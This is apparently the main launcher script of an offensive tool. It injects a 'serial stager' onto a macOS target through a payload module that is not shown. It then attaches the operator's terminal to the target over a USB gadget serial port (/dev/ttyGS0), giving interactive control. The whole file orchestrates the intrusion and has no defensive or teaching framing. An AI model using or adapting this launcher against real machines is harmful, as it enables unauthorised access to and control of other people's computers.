#!/usr/bin/env python3

import lib.payloads
from lib.config import Config
from lib.logger import Logger
from lib.relay import Relay

def main():
    # Setup the environment
    Logger.setup(Logger.INFO)
    Config.load()
    Logger.set_level(Config.get("dev", "log_level", Logger.INFO))

    # Setup dev mode if enabled.
    if Config.get("dev", "stack_trace_errors", False):
        Logger.set_level(Logger.DEBUG)
        Logger.debug("Developer mode enabled.")

    # Run the program
    Logger.info("Injecting serial stager on target...")
    lib.payloads.macos(show_diagnostics=True)

    Logger.success("Attaching to serial...")
    print("")

    Relay().stdio(
        device=Config.get("serial", "path", "/dev/ttyGS0"),
        baud=int(Config.get("serial", "baud", 115200))
    )

    print("")
    Logger.info("Session closed.")
    print("")

    return 0

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        if Config.get("dev", "stack_trace_errors", False):
            raise
        else:
            Logger.error(f"Error: {e}")